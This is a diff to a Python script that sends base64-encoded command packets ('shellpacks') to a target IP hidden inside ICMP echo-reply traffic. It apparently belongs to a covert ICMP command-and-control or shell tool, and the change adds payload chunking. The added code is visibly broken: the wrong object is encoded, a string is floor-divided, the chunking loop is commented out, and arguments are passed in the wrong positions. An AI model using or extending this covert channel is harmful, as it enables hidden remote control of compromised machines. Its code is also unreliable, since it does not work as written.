@@ -8,6 +8,7 @@ import base64
 
 TTL = int(64)
 ICMP_ID = int(12800)
+MAX_DATA_SIZE = 1000
 
 class Host:
     def __init__(self):
@@ -55,21 +56,38 @@ class Host:
     def instruction(self, shellpack):
         pass
             
-    def build_shellpack(self, command: str, data: str | None = None) -> dict:
+    def build_shellpacks(self, command: str, option: str | None = None, data: str | None = None) -> list[dict]:
+        shellpacks = []
+
         shellpack = {
             "command": command,
+            "option": option,
             "data" : data
             }
         
-        shellpack = str(shellpack).encode()
-        shellpack = base64.b64encode(shellpack)
-        return shellpack
+        encoded_shellpack = str(shellpack).encode()
+        encoded_shellpack = base64.b64encode(shellpack)
 
-    def send(self, ip, command: str, data: str | None = None) -> bool:
-        shellpack = self.build_shellpack(command, data)
-        data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
-        sr(data, timeout=0, verbose=0)
-        # print(f" $ {command} sent to {ip} > {message}")
+        shellpack_length = len(encoded_shellpack)
+
+        if shellpack_length > MAX_DATA_SIZE:
+            num_shellpacks = ( data // ( MAX_DATA_SIZE - ( shellpack_length - len(data) ) ) )
+            print(num_shellpacks)
+
+            # for i in range(num_shellpacks):
+            #     shellpack['data'] = data[:len(shellpack//num_shellpacks)]
+        else:
+            shellpacks = [shellpack]
+
+        return shellpacks
+
+    def send(self, ip, command: str, data: str | None = None, option: str | None = None) -> bool:
+        shellpacks = self.build_shellpacks(command, data)
+
+        for shellpack in shellpacks:
+            data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
+            sr(data, timeout=0, verbose=0)
+            # print(f" $ {command} sent to {ip} > {message}")
 
 def get_iface(ip) -> str:
     nics = psutil.net_if_addrs()
